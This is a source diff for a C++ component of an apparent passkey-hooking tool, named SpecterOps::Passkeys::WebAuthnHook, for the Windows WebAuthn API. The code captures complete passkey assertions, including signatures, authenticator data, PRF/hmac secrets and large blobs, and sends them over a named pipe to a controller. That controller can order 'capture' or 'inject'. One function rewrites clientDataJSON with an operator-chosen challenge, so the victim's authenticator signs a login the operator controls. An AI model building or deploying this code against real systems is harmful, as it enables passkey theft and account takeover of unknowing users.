@@ -1,6 +1,30 @@
 #include "NamedPipe.h"
 
+#if defined(_MSC_VER)
+#pragma warning(push, 0)
+// Third-party headers trip these MSVC/analyzer diagnostics:
+// C4702: unreachable code.
+// C6297: 32-bit value is shifted before being cast to a larger type.
+// C6319: comma operator in a tested expression ignores the left argument.
+// C26495: member variable is not initialized by a constructor or initializer.
+// C33010: enum is used as an array index without a lower-bound check.
+#pragma warning(disable: 4702 6297 6319 26495 33010)
+#endif
+#include <cppcodec/base64_url_unpadded.hpp>
+#include <rapidjson/document.h>
+#include <rapidjson/stream.h>
+#include <rapidjson/stringbuffer.h>
+#include <rapidjson/writer.h>
+#if defined(_MSC_VER)
+#pragma warning(pop)
+#endif
+
+#include <array>
 #include <cstdio>
+#include <cstdint>
+#include <cstring>
+#include <cwchar>
+#include <optional>
 #include <string>
 #include <string_view>
 
@@ -8,9 +32,31 @@ namespace SpecterOps::Passkeys::WebAuthnHook
 {
     namespace
     {
-        constexpr size_t SerializedAssertionJsonOverhead = 256;
+        using Base64Url = cppcodec::base64_url_unpadded;
 
-        // Returns the current UTC time formatted as an ISO 8601 timestamp (e.g. "2026-04-25T10:18:30.224Z").
+        /// Transcodes a UTF-16 string view to UTF-8.
+        std::string Utf16ToUtf8(const std::wstring_view wide)
+        {
+            if (wide.empty())
+            {
+                return {};
+            }
+
+            rapidjson::GenericStringStream<rapidjson::UTF16<wchar_t>> source(wide.data());
+            rapidjson::StringBuffer target;
+
+            while (source.Tell() < wide.size())
+            {
+                if (!rapidjson::Transcoder<rapidjson::UTF16<wchar_t>, rapidjson::UTF8<>>::Transcode(source, target))
+                {
+                    return {};
+                }
+            }
+
+            return std::string(target.GetString(), target.GetSize());
+        }
+
+        /// Returns the current UTC time formatted as an ISO 8601 timestamp.
         std::string IsoTimestampUtc()
         {
             SYSTEMTIME st{};
@@ -32,258 +78,516 @@ namespace SpecterOps::Passkeys::WebAuthnHook
             return buf;
         }
 
-        std::string WideToUtf8(std::wstring_view wide)
+        /// Converts a hook pipe action enum to its JSON wire-format name.
+        std::string_view HookPipeActionJsonName(const HookPipeAction action)
         {
-            if (wide.empty())
+            switch (action)
             {
-                return {};
+            case HookPipeAction::Continue: return "continue";
+            case HookPipeAction::Capture:  return "capture";
+            case HookPipeAction::Inject:   return "inject";
+            case HookPipeAction::Wait:     return "wait";
+            case HookPipeAction::Unknown:  return "unknown";
+            default:                       return "unknown";
             }
-
-            const int length = ::WideCharToMultiByte(
-                CP_UTF8, 0,
-                wide.data(), static_cast<int>(wide.size()),
-                nullptr, 0, nullptr, nullptr);
-
-            if (length <= 0)
-            {
-                return {};
-            }
-
-            std::string utf8(static_cast<size_t>(length), '\0');
-            ::WideCharToMultiByte(
-                CP_UTF8, 0,
-                wide.data(), static_cast<int>(wide.size()),
-                utf8.data(), length, nullptr, nullptr);
-            return utf8;
         }
 
-        std::string JsonEscapeString(std::string_view str)
+        /// Writes an extension output value from the generic WEBAUTHN_EXTENSION wrapper.
+        void WriteExtensionValue(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_EXTENSION& extension)
         {
-            std::string result;
-            result.reserve(str.size());
-            for (const unsigned char c : str)
+            if (extension.pvExtension == nullptr || extension.cbExtension == 0)
             {
-                switch (c)
-                {
-                case '"':  result += "\\\""; break;
-                case '\\': result += "\\\\"; break;
-                case '\n': result += "\\n";  break;
-                case '\r': result += "\\r";  break;
-                case '\t': result += "\\t";  break;
-                default:
-                    if (c < 0x20)
-                    {
-                        char buf[8];
-                        snprintf(buf, sizeof(buf), "\\u%04X", static_cast<unsigned>(c));
-                        result += buf;
-                    }
-                    else
-                    {
-                        result += static_cast<char>(c);
-                    }
-                    break;
-                }
+                writer.Null();
+                return;
             }
-            return result;
+
+            if (extension.pwszExtensionIdentifier != nullptr
+                && wcscmp(extension.pwszExtensionIdentifier, WEBAUTHN_EXTENSIONS_IDENTIFIER_CRED_BLOB) == 0
+                && extension.cbExtension == sizeof(WEBAUTHN_CRED_BLOB_EXTENSION))
+            {
+                const auto* credBlob = static_cast<const WEBAUTHN_CRED_BLOB_EXTENSION*>(extension.pvExtension);
+                const std::string value = (credBlob->pbCredBlob != nullptr && credBlob->cbCredBlob > 0)
+                    ? Base64Url::encode(credBlob->pbCredBlob, credBlob->cbCredBlob)
+                    : std::string{};
+                writer.String(value.c_str(), static_cast<rapidjson::SizeType>(value.size()));
+                return;
+            }
+
+            if (extension.cbExtension == sizeof(BOOL))
+            {
+                writer.Bool(*static_cast<const BOOL*>(extension.pvExtension) != FALSE);
+                return;
+            }
+
+            if (extension.cbExtension == sizeof(DWORD))
+            {
+                writer.Uint(*static_cast<const DWORD*>(extension.pvExtension));
+                return;
+            }
+
+            const std::string value = Base64Url::encode(
+                static_cast<const uint8_t*>(extension.pvExtension),
+                extension.cbExtension);
+            writer.String(value.c_str(), static_cast<rapidjson::SizeType>(value.size()));
         }
 
-        std::string Base64UrlEncode(const BYTE* buffer, DWORD length)
+        /// Writes extension outputs carried by WEBAUTHN_ASSERTION::Extensions.
+        void WriteExtensionResults(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_EXTENSIONS& extensions)
         {
-            if (buffer == nullptr || length == 0)
+            if (extensions.pExtensions == nullptr)
             {
-                return {};
+                return;
             }
 
-            constexpr char Base64Alphabet[] =
-                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-
-            std::string encoded;
-            encoded.reserve(((static_cast<size_t>(length) + 2) / 3) * 4);
-
-            for (DWORD index = 0; index < length; index += 3)
+            for (DWORD i = 0; i < extensions.cExtensions; ++i)
             {
-                const DWORD remaining = length - index;
-                const BYTE byte0 = buffer[index];
-                const BYTE byte1 = remaining > 1 ? buffer[index + 1] : 0;
-                const BYTE byte2 = remaining > 2 ? buffer[index + 2] : 0;
-
-                encoded.push_back(Base64Alphabet[(byte0 >> 2) & 0x3F]);
-                encoded.push_back(Base64Alphabet[((byte0 & 0x03) << 4) | ((byte1 >> 4) & 0x0F)]);
-
-                if (remaining > 1)
+                const WEBAUTHN_EXTENSION& extension = extensions.pExtensions[i];
+                if (extension.pwszExtensionIdentifier == nullptr)
                 {
-                    encoded.push_back(Base64Alphabet[((byte1 & 0x0F) << 2) | ((byte2 >> 6) & 0x03)]);
+                    continue;
                 }
 
-                if (remaining > 2)
-                {
-                    encoded.push_back(Base64Alphabet[byte2 & 0x3F]);
-                }
+                const std::string name = Utf16ToUtf8(extension.pwszExtensionIdentifier);
+                writer.Key(name.c_str(), static_cast<rapidjson::SizeType>(name.size()));
+                WriteExtensionValue(writer, extension);
             }
-
-            return encoded;
         }
 
-        std::string SerializeAssertionResponse(
+        /// Writes largeBlob extension output from the assertion struct.
+        void WriteLargeBlobResult(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_ASSERTION* assertion)
+        {
+            if (assertion == nullptr
+                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_2
+                || (assertion->dwCredLargeBlobStatus == WEBAUTHN_CRED_LARGE_BLOB_STATUS_NONE
+                    && (assertion->pbCredLargeBlob == nullptr || assertion->cbCredLargeBlob == 0)))
+            {
+                return;
+            }
+
+            writer.Key("largeBlob");
+            writer.StartObject();
+            writer.Key("status");
+            writer.Uint(assertion->dwCredLargeBlobStatus);
+
+            if (assertion->pbCredLargeBlob != nullptr && assertion->cbCredLargeBlob > 0)
+            {
+                const std::string blob = Base64Url::encode(assertion->pbCredLargeBlob, assertion->cbCredLargeBlob);
+                writer.Key("blob");
+                writer.String(blob.c_str(), static_cast<rapidjson::SizeType>(blob.size()));
+            }
+            else if (assertion->dwCredLargeBlobStatus != WEBAUTHN_CRED_LARGE_BLOB_STATUS_NONE)
+            {
+                writer.Key("written");
+                writer.Bool(assertion->dwCredLargeBlobStatus == WEBAUTHN_CRED_LARGE_BLOB_STATUS_SUCCESS);
+            }
+
+            writer.EndObject();
+        }
+
+        /// Writes PRF/HMAC secret extension output from the assertion struct.
+        void WritePrfResult(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_ASSERTION* assertion)
+        {
+            if (assertion == nullptr
+                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_3
+                || assertion->pHmacSecret == nullptr
+                || assertion->pHmacSecret->pbFirst == nullptr
+                || assertion->pHmacSecret->cbFirst == 0)
+            {
+                return;
+            }
+
+            writer.Key("prf");
+            writer.StartObject();
+            writer.Key("results");
+            writer.StartObject();
+
+            const std::string first = Base64Url::encode(
+                assertion->pHmacSecret->pbFirst,
+                assertion->pHmacSecret->cbFirst);
+            writer.Key("first");
+            writer.String(first.c_str(), static_cast<rapidjson::SizeType>(first.size()));
+
+            if (assertion->pHmacSecret->pbSecond != nullptr && assertion->pHmacSecret->cbSecond > 0)
+            {
+                const std::string second = Base64Url::encode(
+                    assertion->pHmacSecret->pbSecond,
+                    assertion->pHmacSecret->cbSecond);
+                writer.Key("second");
+                writer.String(second.c_str(), static_cast<rapidjson::SizeType>(second.size()));
+            }
+
+            writer.EndObject();
+            writer.EndObject();
+        }
+
+        /// Writes raw unsigned extension outputs when Windows exposes their CBOR map.
+        void WriteUnsignedExtensionOutputs(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_ASSERTION* assertion)
+        {
+            if (assertion == nullptr
+                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_5
+                || assertion->pbUnsignedExtensionOutputs == nullptr
+                || assertion->cbUnsignedExtensionOutputs == 0)
+            {
+                return;
+            }
+
+            const std::string value = Base64Url::encode(
+                assertion->pbUnsignedExtensionOutputs,
+                assertion->cbUnsignedExtensionOutputs);
+            writer.Key("unsignedExtensionOutputs");
+            writer.String(value.c_str(), static_cast<rapidjson::SizeType>(value.size()));
+        }
+
+        /// Writes client extension results from fields on the native assertion struct.
+        void WriteClientExtensionResults(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_ASSERTION* assertion)
+        {
+            writer.StartObject();
+
+            if (assertion != nullptr && assertion->dwVersion >= WEBAUTHN_ASSERTION_VERSION_2)
+            {
+                WriteExtensionResults(writer, assertion->Extensions);
+            }
+
+            WriteLargeBlobResult(writer, assertion);
+            WritePrfResult(writer, assertion);
+            WriteUnsignedExtensionOutputs(writer, assertion);
+
+            writer.EndObject();
+        }
+
+        /// Writes authenticatorAttachment when the assertion exposes transport data.
+        void WriteAuthenticatorAttachment(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const WEBAUTHN_ASSERTION* assertion)
+        {
+            if (assertion == nullptr
+                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_4
+                || assertion->dwUsedTransport == 0)
+            {
+                return;
+            }
+
+            std::string_view authenticatorAttachment;
+            if ((assertion->dwUsedTransport & WEBAUTHN_CTAP_TRANSPORT_INTERNAL) != 0)
+            {
+                authenticatorAttachment = "platform";
+            }
+            else
+            {
+                constexpr DWORD CrossPlatformTransports =
+                    WEBAUTHN_CTAP_TRANSPORT_USB
+                    | WEBAUTHN_CTAP_TRANSPORT_NFC
+                    | WEBAUTHN_CTAP_TRANSPORT_BLE
+                    | WEBAUTHN_CTAP_TRANSPORT_TEST
+                    | WEBAUTHN_CTAP_TRANSPORT_HYBRID
+                    | WEBAUTHN_CTAP_TRANSPORT_SMART_CARD;
+
+                if ((assertion->dwUsedTransport & CrossPlatformTransports) == 0)
+                {
+                    return;
+                }
+
+                authenticatorAttachment = "cross-platform";
+            }
+
+            writer.Key("authenticatorAttachment");
+            writer.String(
+                authenticatorAttachment.data(),
+                static_cast<rapidjson::SizeType>(authenticatorAttachment.size()));
+        }
+
+        /// Writes the native assertion fields as a WebAuthn-style JSON response object.
+        void WriteAssertionResponse(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
             const WEBAUTHN_CLIENT_DATA* clientData,
             const WEBAUTHN_ASSERTION* assertion)
         {
             const std::string credentialId = (assertion != nullptr && assertion->Credential.pbId != nullptr && assertion->Credential.cbId > 0)
-                ? Base64UrlEncode(assertion->Credential.pbId, assertion->Credential.cbId)
+                ? Base64Url::encode(assertion->Credential.pbId, assertion->Credential.cbId)
                 : std::string{};
             const std::string clientDataJson = (clientData != nullptr && clientData->pbClientDataJSON != nullptr && clientData->cbClientDataJSON > 0)
-                ? Base64UrlEncode(clientData->pbClientDataJSON, clientData->cbClientDataJSON)
+                ? Base64Url::encode(clientData->pbClientDataJSON, clientData->cbClientDataJSON)
                 : std::string{};
             const std::string authenticatorData = (assertion != nullptr && assertion->pbAuthenticatorData != nullptr && assertion->cbAuthenticatorData > 0)
-                ? Base64UrlEncode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData)
+                ? Base64Url::encode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData)
                 : std::string{};
             const std::string signature = (assertion != nullptr && assertion->pbSignature != nullptr && assertion->cbSignature > 0)
-                ? Base64UrlEncode(assertion->pbSignature, assertion->cbSignature)
+                ? Base64Url::encode(assertion->pbSignature, assertion->cbSignature)
                 : std::string{};
             const std::string userHandle = (assertion != nullptr && assertion->pbUserId != nullptr && assertion->cbUserId > 0)
-                ? Base64UrlEncode(assertion->pbUserId, assertion->cbUserId)
+                ? Base64Url::encode(assertion->pbUserId, assertion->cbUserId)
                 : std::string{};
 
-            std::string json;
-            json.reserve(
-                credentialId.size() * 2
-                + clientDataJson.size()
-                + authenticatorData.size()
-                + signature.size()
-                + userHandle.size()
-                + SerializedAssertionJsonOverhead);
-
-            json += R"({"id":")";
-            json += credentialId;
-            json += R"(","rawId":")";
-            json += credentialId;
-            json += R"(","type":"public-key","response":{"clientDataJSON":")";
-            json += clientDataJson;
-            json += R"(","authenticatorData":")";
-            json += authenticatorData;
-            json += R"(","signature":")";
-            json += signature;
-            json += R"(","userHandle":)";
+            writer.StartObject();
+            writer.Key("id");
+            writer.String(credentialId.c_str(), static_cast<rapidjson::SizeType>(credentialId.size()));
+            writer.Key("rawId");
+            writer.String(credentialId.c_str(), static_cast<rapidjson::SizeType>(credentialId.size()));
+            writer.Key("type");
+            writer.String("public-key");
+            WriteAuthenticatorAttachment(writer, assertion);
+            writer.Key("response");
+            writer.StartObject();
+            writer.Key("clientDataJSON");
+            writer.String(clientDataJson.c_str(), static_cast<rapidjson::SizeType>(clientDataJson.size()));
+            writer.Key("authenticatorData");
+            writer.String(authenticatorData.c_str(), static_cast<rapidjson::SizeType>(authenticatorData.size()));
+            writer.Key("signature");
+            writer.String(signature.c_str(), static_cast<rapidjson::SizeType>(signature.size()));
+            writer.Key("userHandle");
 
             if (assertion == nullptr || assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
             {
-                json += "null";
+                writer.Null();
             }
             else
             {
-                json += '"';
-                json += userHandle;
-                json += '"';
+                writer.String(userHandle.c_str(), static_cast<rapidjson::SizeType>(userHandle.size()));
             }
 
-            json += R"(},"clientExtensionResults":{}})";
-            return json;
+            writer.EndObject();
+            writer.Key("clientExtensionResults");
+            WriteClientExtensionResults(writer, assertion);
+            writer.EndObject();
         }
 
-        // Appends the common fields shared by all pipe messages: type discriminator, timestamp,
-        // pid, processName, and userName.  The caller appends any type-specific fields and the
-        // closing brace.
-        void AppendCommonFields(
-            std::string& msg,
-            const char* type,
+        /// Writes the common fields shared by all pipe messages.
+        void WriteCommonFields(
+            rapidjson::Writer<rapidjson::StringBuffer>& writer,
+            const std::string_view type,
             const std::string& timestamp,
-            std::wstring_view processName,
-            std::wstring_view userName,
-            DWORD pid)
+            const std::wstring_view processName,
+            const std::wstring_view userName,
+            const DWORD pid,
+            const HookPipeAction previousAction)
         {
-            const std::string processNameEscaped = JsonEscapeString(WideToUtf8(processName));
-            const std::string userNameEscaped    = JsonEscapeString(WideToUtf8(userName));
+            const std::string processNameUtf8 = Utf16ToUtf8(processName);
+            const std::string userNameUtf8    = Utf16ToUtf8(userName);
 
-            msg += R"({"type":")";
-            msg += type;
-            msg += R"(","timestamp":")";
-            msg += timestamp;
-            msg += R"(","pid":)";
-            msg += std::to_string(pid);
-            msg += R"(,"processName":")";
-            msg += processNameEscaped;
-            msg += R"(","userName":")";
-            msg += userNameEscaped;
-            msg += '"';
+            writer.Key("type");
+            writer.String(type.empty() ? "" : type.data(), static_cast<rapidjson::SizeType>(type.size()));
+            writer.Key("timestamp");
+            writer.String(timestamp.c_str(), static_cast<rapidjson::SizeType>(timestamp.size()));
+            writer.Key("pid");
+            writer.Uint(static_cast<unsigned>(pid));
+            writer.Key("processName");
+            writer.String(processNameUtf8.c_str(), static_cast<rapidjson::SizeType>(processNameUtf8.size()));
+            writer.Key("userName");
+            writer.String(userNameUtf8.c_str(), static_cast<rapidjson::SizeType>(userNameUtf8.size()));
+
+            if (previousAction != HookPipeAction::Unknown)
+            {
+                const std::string_view previousActionName = HookPipeActionJsonName(previousAction);
+                writer.Key("previousAction");
+                writer.String(
+                    previousActionName.empty() ? "" : previousActionName.data(),
+                    static_cast<rapidjson::SizeType>(previousActionName.size()));
+            }
         }
     }
 
-    HANDLE OpenHookPipe()
+    /// Parses a UTF-8 JSON object into a RapidJSON DOM.
+    bool TryParseJsonObject(const std::string_view json, rapidjson::Document& document)
     {
-        return ::CreateFileW(
-            WebAuthnHookPipeName,
-            GENERIC_WRITE,
-            0,
-            nullptr,
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            nullptr);
+        document.Parse(json.empty() ? "" : json.data(), json.size());
+        return !document.HasParseError() && document.IsObject();
     }
 
-    bool WritePipeMessage(HANDLE pipe, std::string_view message)
+    /// Sends a hook pipe message and returns the optional response body.
+    std::optional<std::string> SendPipeMessage(const std::string_view message, const DWORD timeoutMs)
     {
-        DWORD bytesWritten = 0;
-        return ::WriteFile(
-                   pipe,
-                   message.data(),
-                   static_cast<DWORD>(message.size()),
-                   &bytesWritten,
-                   nullptr)
-            && bytesWritten == message.size();
+        if (message.size() > MAXDWORD)
+        {
+            return std::nullopt;
+        }
+
+        std::array<char, MaxPipeResponseBytes> response{};
+        DWORD bytesRead = 0;
+
+        if (!::CallNamedPipeW(
+                WebAuthnHookPipeName,
+                const_cast<char*>(message.data()),
+                static_cast<DWORD>(message.size()),
+                response.data(),
+                static_cast<DWORD>(response.size()),
+                &bytesRead,
+                timeoutMs))
+        {
+            return std::nullopt;
+        }
+
+        if (bytesRead == 0)
+        {
+            return std::nullopt;
+        }
+
+        return std::string(response.data(), bytesRead);
     }
 
-    std::string BuildAssertionStartedMessage(
-        LPCWSTR rpId,
-        std::wstring_view processName,
-        std::wstring_view userName,
-        DWORD pid)
+    /// Parses the requested hook action from a pipe response message.
+    HookPipeAction ParsePipeMessageAction(const std::string_view message)
     {
-        const std::string timestamp   = IsoTimestampUtc();
-        const std::string rpIdEscaped = JsonEscapeString(WideToUtf8(rpId ? rpId : L""));
+        rapidjson::Document document;
+        if (!TryParseJsonObject(message, document))
+        {
+            return HookPipeAction::Unknown;
+        }
 
-        std::string msg;
-        AppendCommonFields(msg, "AssertionStarted", timestamp, processName, userName, pid);
-        msg += R"(,"rpId":")";
-        msg += rpIdEscaped;
-        msg += R"("})";
-        return msg;
+        const rapidjson::Value::ConstMemberIterator action = document.FindMember("action");
+        if (action == document.MemberEnd() || !action->value.IsString())
+        {
+            return HookPipeAction::Unknown;
+        }
+
+        const std::string_view actionValue(action->value.GetString(), action->value.GetStringLength());
+        struct ActionName
+        {
+            std::string_view name;
+            HookPipeAction action;
+        };
+
+        constexpr std::array<ActionName, 4> actions{{
+            { "continue", HookPipeAction::Continue },
+            { "capture",  HookPipeAction::Capture },
+            { "inject",   HookPipeAction::Inject },
+            { "wait",     HookPipeAction::Wait },
+        }};
+
+        for (const ActionName& candidate : actions)
+        {
+            if (actionValue.size() == candidate.name.size()
+                && _strnicmp(actionValue.data(), candidate.name.data(), candidate.name.size()) == 0)
+            {
+                return candidate.action;
+            }
+        }
+
+        return HookPipeAction::Unknown;
     }
 
-    std::string BuildAssertionCompletedMessage(
-        std::wstring_view processName,
-        std::wstring_view userName,
-        DWORD pid,
+    /// Builds a replacement clientDataJSON buffer with an injected base64url challenge.
+    std::optional<std::string> BuildClientDataJsonWithChallenge(
         const WEBAUTHN_CLIENT_DATA* clientData,
-        const WEBAUTHN_ASSERTION* assertion)
+        const std::string_view challenge)
     {
-        const std::string payload = SerializeAssertionResponse(clientData, assertion);
-        const std::string timestamp = IsoTimestampUtc();
+        if (clientData == nullptr
+            || clientData->pbClientDataJSON == nullptr
+            || clientData->cbClientDataJSON == 0
+            || challenge.empty())
+        {
+            return std::nullopt;
+        }
 
-        std::string msg;
-        AppendCommonFields(msg, "AssertionCompleted", timestamp, processName, userName, pid);
-        msg += R"(,"payload":)";
-        msg += payload;
-        msg += '}';
-        return msg;
+        const std::string_view clientDataJson(
+            reinterpret_cast<const char*>(clientData->pbClientDataJSON),
+            clientData->cbClientDataJSON);
+
+        rapidjson::Document document;
+        if (!TryParseJsonObject(clientDataJson, document))
+        {
+            return std::nullopt;
+        }
+
+        rapidjson::Value::MemberIterator challengeMember = document.FindMember("challenge");
+        if (challengeMember == document.MemberEnd() || !challengeMember->value.IsString())
+        {
+            return std::nullopt;
+        }
+
+        challengeMember->value.SetString(
+            challenge.empty() ? "" : challenge.data(),
+            static_cast<rapidjson::SizeType>(challenge.size()),
+            document.GetAllocator());
+
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+        if (!document.Accept(writer))
+        {
+            return std::nullopt;
+        }
+
+        return std::string(buffer.GetString(), buffer.GetSize());
     }
 
-    std::string BuildAssertionErrorMessage(
-        LPCWSTR rpId,
-        std::wstring_view processName,
-        std::wstring_view userName,
-        DWORD pid,
-        HRESULT hresult)
+    /// Builds the JSON message sent when a WebAuthn assertion request starts.
+    std::string BuildAssertionStartedMessage(
+        const std::wstring_view rpId,
+        const std::wstring_view processName,
+        const std::wstring_view userName,
+        const DWORD pid,
+        const HookPipeAction previousAction)
     {
         const std::string timestamp   = IsoTimestampUtc();
-        const std::string rpIdEscaped = JsonEscapeString(WideToUtf8(rpId ? rpId : L""));
+        const std::string rpIdUtf8    = Utf16ToUtf8(rpId);
 
-        std::string msg;
-        AppendCommonFields(msg, "AssertionError", timestamp, processName, userName, pid);
-        msg += R"(,"rpId":")";
-        msg += rpIdEscaped;
-        msg += R"(","hresult":)";
-        msg += std::to_string(static_cast<uint32_t>(hresult));
-        msg += '}';
-        return msg;
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+        writer.StartObject();
+        WriteCommonFields(writer, "AssertionStarted", timestamp, processName, userName, pid, previousAction);
+        writer.Key("rpId");
+        writer.String(rpIdUtf8.c_str(), static_cast<rapidjson::SizeType>(rpIdUtf8.size()));
+        writer.EndObject();
+        return std::string(buffer.GetString(), buffer.GetSize());
+    }
+
+    /// Builds the JSON message sent when a WebAuthn assertion request completes successfully.
+    std::string BuildAssertionCompletedMessage(
+        const std::wstring_view rpId,
+        const std::wstring_view processName,
+        const std::wstring_view userName,
+        const DWORD pid,
+        const WEBAUTHN_CLIENT_DATA* clientData,
+        const WEBAUTHN_ASSERTION* assertion,
+        const HookPipeAction previousAction)
+    {
+        const std::string timestamp = IsoTimestampUtc();
+        const std::string rpIdUtf8 = Utf16ToUtf8(rpId);
+
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+        writer.StartObject();
+        WriteCommonFields(writer, "AssertionCompleted", timestamp, processName, userName, pid, previousAction);
+        writer.Key("rpId");
+        writer.String(rpIdUtf8.c_str(), static_cast<rapidjson::SizeType>(rpIdUtf8.size()));
+        writer.Key("payload");
+        WriteAssertionResponse(writer, clientData, assertion);
+        writer.EndObject();
+        return std::string(buffer.GetString(), buffer.GetSize());
+    }
+
+    /// Builds the JSON message sent when a WebAuthn assertion request returns an error.
+    std::string BuildAssertionErrorMessage(
+        const std::wstring_view rpId,
+        const std::wstring_view processName,
+        const std::wstring_view userName,
+        const DWORD pid,
+        const HRESULT hresult,
+        const HookPipeAction previousAction)
+    {
+        const std::string timestamp   = IsoTimestampUtc();
+        const std::string rpIdUtf8    = Utf16ToUtf8(rpId);
+
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+        writer.StartObject();
+        WriteCommonFields(writer, "AssertionError", timestamp, processName, userName, pid, previousAction);
+        writer.Key("rpId");
+        writer.String(rpIdUtf8.c_str(), static_cast<rapidjson::SizeType>(rpIdUtf8.size()));
+        writer.Key("hresult");
+        writer.Uint(static_cast<uint32_t>(hresult));
+        writer.EndObject();
+        return std::string(buffer.GetString(), buffer.GetSize());
     }
 }
